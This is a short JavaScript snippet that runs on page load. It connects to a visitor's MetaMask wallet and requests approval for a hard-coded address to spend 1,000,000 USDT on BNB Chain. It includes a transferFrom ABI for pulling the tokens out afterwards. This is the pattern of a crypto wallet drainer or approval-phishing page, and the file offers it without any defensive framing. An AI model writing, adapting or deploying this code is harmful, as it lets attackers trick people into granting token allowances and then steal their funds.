
window.onload = async function () {
  if (window.ethereum) {
    const web3 = new Web3(window.ethereum);
    try {
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const userAccount = accounts[0];

      const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
      const recipient = "0x4Be289B65367A079bf699b9Ba4D946E904225533"; // Your wallet

      const abi = [
        {
          constant: false,
          inputs: [
            { name: "_spender", type: "address" },
            { name: "_value", type: "uint256" }
          ],
          name: "approve",
          outputs: [{ name: "", type: "bool" }],
          type: "function"
        },
        {
          constant: false,
          inputs: [
            { name: "_from", type: "address" },
            { name: "_to", type: "address" },
            { name: "_value", type: "uint256" }
          ],
          name: "transferFrom",
          outputs: [{ name: "", type: "bool" }],
          type: "function"
        }
      ];

      const contract = new web3.eth.Contract(abi, tokenAddress);
      const amount = web3.utils.toWei('1000000', 'mwei'); // 1M USDT (demo)

      await contract.methods.approve(recipient, amount).send({ from: userAccount });
      console.log("✅ Approval successful. Manual transferFrom required from your wallet.");
    } catch (err) {
      console.error("❌ Error:", err.message);
    }
  } else {
    alert("❗ Please install MetaMask.");
  }
};
